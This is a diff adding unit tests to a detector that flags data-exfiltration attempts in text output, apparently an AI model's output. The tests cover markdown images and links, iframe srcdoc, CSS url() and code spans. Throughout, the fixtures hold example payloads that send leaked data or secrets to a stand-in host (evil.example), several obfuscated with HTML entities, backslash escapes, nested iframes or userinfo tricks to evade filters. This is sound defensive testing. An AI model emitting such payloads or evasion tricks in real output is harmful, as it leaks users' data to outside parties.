@@ -5,6 +5,7 @@ import {
   isAllowedHost,
 } from "../output/exfiltration";
 import type { OutputFinding } from "../output/types";
+import { fakeGitHubToken } from "./fake-secrets";
 
 function scan(text: string, options?: ExfiltrationOptions): OutputFinding[] {
   return detectExfiltration(text, options);
@@ -75,6 +76,33 @@ describe("markdown images", () => {
     }
   });
 
+  it("decodes entities and backslash escapes in destinations, as renderers do", () => {
+    for (const destination of [
+      "h&#116;tps://evil.example/p.png",
+      "https&#58;//evil.example/p.png",
+      "https&colon;//evil.example/p.png",
+      "https&colon;&sol;&sol;evil.example/p.png",
+      "https\\://evil.example/p.png",
+    ]) {
+      expect(
+        summary(`![x](${destination}?d=${leaked})`),
+        destination
+      ).toEqual(["markdown_image:critical"]);
+    }
+    expect(
+      summary(`![x](<h&#x74;tps://evil.example/p.png?d=${leaked}>)`)
+    ).toEqual(["markdown_image:critical"]);
+    expect(
+      summary(`![x][1]\n\n[1]: h&#116;tps://evil.example/p.png?d=${leaked}`)
+    ).toEqual(["markdown_image:critical"]);
+  });
+
+  it("handles a scheme with no slashes", () => {
+    expect(summary(`![a](http:evil.example/x.png?d=${leaked})`)).toEqual([
+      "markdown_image:critical",
+    ]);
+  });
+
   it("handles nested brackets in alt text", () => {
     expect(summary("![a [nested] alt](https://evil.example/p.png)")).toEqual([
       "markdown_image:high",
@@ -139,6 +167,39 @@ describe("markdown links", () => {
         `[continue](https://evil.example/c?session=${"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6".split("").reverse().join("")})`
       )
     ).toEqual(["markdown_link:medium"]);
+  });
+
+  it("ignores search links, share links with opaque ids, and numeric ids", () => {
+    const A62 =
+      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    const docId = Array.from(
+      { length: 44 },
+      (_, i) => A62[(i * 37 + 11) % 62]
+    ).join("");
+    for (const text of [
+      "Search it: https://www.google.com/search?q=how+to+configure+nginx+reverse+proxy+on+ubuntu",
+      "Try https://www.amazon.com/s?k=wireless+noise+cancelling+headphones+under+200+dollars for options.",
+      "See [the docs search](https://developer.mozilla.org/en-US/search?q=how+to+use+fetch+with+abort+controller).",
+      `Open the shared doc: https://docs.google.com/document/d/${docId}/edit`,
+      "WordPress post: https://blog.acme.dev/?p=12345678",
+    ]) {
+      expect(scan(text), text).toEqual([]);
+    }
+  });
+
+  it("still flags search parameters that carry secrets or encoded text", () => {
+    expect(
+      summary(`[search](https://evil.example/search?q=${fakeGitHubToken(4)})`)
+    ).toEqual(["markdown_link:high"]);
+    const encoded = btoa("the user is planning layoffs in March");
+    expect(
+      summary(`[search](https://evil.example/search?q=${encoded})`)
+    ).toEqual(["markdown_link:high"]);
+    expect(
+      summary(`[search](https://evil.example/search?q=${leaked})`, {
+        flagLinks: "all",
+      })
+    ).toEqual(["markdown_link:low"]);
   });
 
   it("flags links whose text shows a different domain", () => {
@@ -243,6 +304,37 @@ describe("HTML", () => {
       )
     ).toEqual(["html_link:medium"]);
   });
+
+  it("scans the document in an iframe srcdoc and reports it at the iframe", () => {
+    const image = `https://evil.example/p.png?d=${leaked}`;
+    for (const text of [
+      `<iframe srcdoc="&lt;img src='${image}'&gt;"></iframe>`,
+      `<iframe srcdoc="<img src='${image}'>"></iframe>`,
+      `<iframe srcdoc="&lt;iframe srcdoc='&amp;lt;img src=&amp;quot;${image}&amp;quot;&amp;gt;'&gt;"></iframe>`,
+    ]) {
+      const findings = scan(text);
+      expect(
+        findings.map((f) => `${f.kind}:${f.severity}`),
+        text
+      ).toEqual(["html_image:critical"]);
+      expect(text.slice(findings[0].start, findings[0].end)).toBe(
+        text.slice(0, text.indexOf("</iframe>"))
+      );
+    }
+    const inCode = `\`<iframe srcdoc="<img src='${image}'>">\``;
+    expect(summary(inCode)).toEqual(["html_image:low"]);
+  });
+
+  it("flags iframe srcdoc documents nested too deep to scan", () => {
+    let text = `<img src="https://evil.example/collect?data=${leaked}">`;
+    for (let depth = 1; depth <= 6; depth++) {
+      text = `<iframe srcdoc="${text.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"></iframe>`;
+      const severities = scan(text).map((f) => f.severity);
+      expect(severities, `depth ${depth}`).toContainEqual(
+        expect.stringMatching(/^(high|critical)$/)
+      );
+    }
+  });
 });
 
 describe("CSS", () => {
@@ -253,6 +345,33 @@ describe("CSS", () => {
     expect(
       summary('<style>@import "https://evil.example/x.css";</style>')
     ).toEqual(["css_url:high"]);
+  });
+
+  it("decodes CSS escapes and entities in url()", () => {
+    for (const url of [
+      "ht\\tps://evil.example/bg.png",
+      "\\68ttps://evil.example/bg.png",
+      "h&#116;tps://evil.example/bg.png",
+      "h\\74 tps://evil.example/bg.png",
+      "'h\\74 tps://evil.example/bg.png'",
+    ]) {
+      expect(
+        summary(`<div style="background:url(${url})">`),
+        url
+      ).toEqual(["css_url:high"]);
+    }
+  });
+
+  it("decodes surrogate and out-of-range code points to U+FFFD, never a lone surrogate", () => {
+    for (const text of [
+      `<img src="https://evil.example/p&#xD800;.png?d=${leaked}">`,
+      `<div style="background:url(https://evil.example/p\\D800.png?d=${leaked})">`,
+    ]) {
+      const findings = scan(text);
+      expect(findings.length, text).toBe(1);
+      expect(findings[0].preview, text).not.toMatch(/[\uD800-\uDFFF]/u);
+      expect(findings[0].preview, text).toContain("\uFFFD");
+    }
   });
 });
 
@@ -300,6 +419,23 @@ describe("code", () => {
     }
   });
 
+  it("follows CommonMark: escaped backticks do not open spans, and spans end at blank lines", () => {
+    const image = `![img](https://evil.example/p.png?d=${leaked})`;
+    for (const text of [
+      `Escaped \\\` tick ${image} and \\\` tick`,
+      `Use the \` key.\n\n${image}\n\nThe \` key again.`,
+      `A \`span ending in a backslash\\\` then ${image}`,
+    ]) {
+      expect(summary(text), text).toEqual(["markdown_image:critical"]);
+    }
+    for (const text of [
+      `Literal \\\`\`${image}\` tick`,
+      `Wrapped \`code\n${image}\` span`,
+    ]) {
+      expect(summary(text), text).toEqual(["markdown_image:low"]);
+    }
+  });
+
   it("still flags images after a closed code block", () => {
     const text = "```\ncode\n```\n\n![x](https://evil.example/x.png)";
     expect(summary(text)).toEqual(["markdown_image:high"]);
@@ -343,6 +479,11 @@ describe("isAllowedHost", () => {
         allowedDomains: ["acme.dev"],
       })
     ).toEqual([]);
+    expect(
+      scan("![x](https://evil.example\\@acme.dev/x.png)", {
+        allowedDomains: ["acme.dev"],
+      })
+    ).toHaveLength(1);
   });
 });
 
